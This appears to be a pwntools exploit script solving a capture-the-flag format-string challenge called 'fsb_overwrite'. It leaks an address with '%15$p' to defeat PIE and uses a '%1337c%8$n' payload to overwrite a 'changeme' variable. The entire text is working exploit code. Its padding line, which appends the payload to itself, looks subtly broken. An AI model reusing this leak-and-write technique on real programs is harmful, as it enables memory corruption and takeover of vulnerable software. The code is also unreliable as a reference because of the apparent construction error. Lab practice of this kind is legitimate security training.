#!/usr/bin/python3

from pwn import *

p = process('./fsb_overwrite')
e = ELF('./fsb_overwrite')

fstring = b"%15$p"
p.sendline(fstring)
leak = int(p.recvline()[:-1], 16) # 이게 main 함수에 주소
code_base = leak-0x1293 # pie 주소

changeme_offset = e.symbols['changeme']
changeme = code_base + changeme_offset


fstring = b"%1337c%8$n"
fstring += fstring.ljust(6, b'a')
fstring += b'A'*6
fstring += p64(changeme)
p.sendline(fstring)

p.interactive()